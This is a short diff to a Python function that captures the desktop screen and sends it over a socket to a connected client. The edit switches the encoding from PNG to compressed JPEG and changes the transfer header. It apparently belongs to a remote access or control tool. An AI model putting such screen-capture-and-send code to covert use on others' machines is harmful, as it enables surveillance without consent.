@@ -209,16 +209,16 @@ def capture_desktop_screenshot(client: socket.socket) -> None:
             # Convert mss screenshot to PIL Image
             image = Image.frombytes('RGB', screenshot.size, screenshot.rgb)
             
-            # Save as PNG bytes
+            # Save as compressed JPEG bytes at 60% quality
             import io
-            png_buffer = io.BytesIO()
-            image.save(png_buffer, format='PNG')
-            png_data = png_buffer.getvalue()
+            jpg_buffer = io.BytesIO()
+            image.save(jpg_buffer, format='JPEG', quality=60, optimize=True)
+            jpg_data = jpg_buffer.getvalue()
             
-            # Send PNG data with explicit header
-            header = f"START_IMG|SIZE|{len(png_data)}\n".encode('utf-8')
-            client.sendall(header + png_data)
-            print(f"[+] Desktop screenshot captured and sent ({len(png_data)} bytes)")
+            # Send compressed JPEG data with explicit header
+            header = f"IMG_START|{len(jpg_data)}|\n".encode('utf-8')
+            client.sendall(header + jpg_data)
+            print(f"[+] Desktop screenshot captured and sent ({len(jpg_data)} bytes)")
     except Exception as e:
         error_msg = f"DEPENDENCY_MISSING: mss Pillow\n" if not MSS_AVAILABLE or not PIL_AVAILABLE else str(e)
         try:
